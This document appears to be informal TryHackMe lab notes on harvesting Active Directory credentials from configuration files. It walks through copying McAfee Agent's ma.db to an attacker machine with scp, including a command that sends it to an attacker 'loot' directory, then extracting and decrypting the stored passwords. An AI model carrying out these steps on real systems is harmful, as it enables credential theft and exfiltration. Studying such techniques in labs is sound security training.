config files are good to discover AD cred 

Web application config files
Service configuration files
Registry keys
Centrally deployed applications



summarized process

:> macfeee has a ma.db which hold valuable info for aD
:>copt it to attack machine and open with sqllitebrowser bcs its sql file
:>find useful entries like auth user and password 
:> user python scirpt tp decrypt
:>mcafee_sitelist_pwd_decrypt.py
user scp to transfer file 


ip adress can be used for easer copying 
from attacker machine
 scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .


form vic machine

scp C:/ProgramData/McAfee/Agent/DB/ma.db thm@10.10.10.5:/home/thm/loot/




prefered do it from attacker machine 

:>scp source:file destination

:> python3 *.py value_to_deccrpt


scp file user@host:/path/to/file                        # copying a file to the remote system using scp command
$ scp user@host:/path/to/file /local/path/to/file         # copying a file from the remote system using scp command

$ scp file1 file2 user@host:/path/to/directory            # copying multiple files using scp command
$ scp -r /path/to/directory user@host:/path/to/directory  # Copying an entire directory with scp command
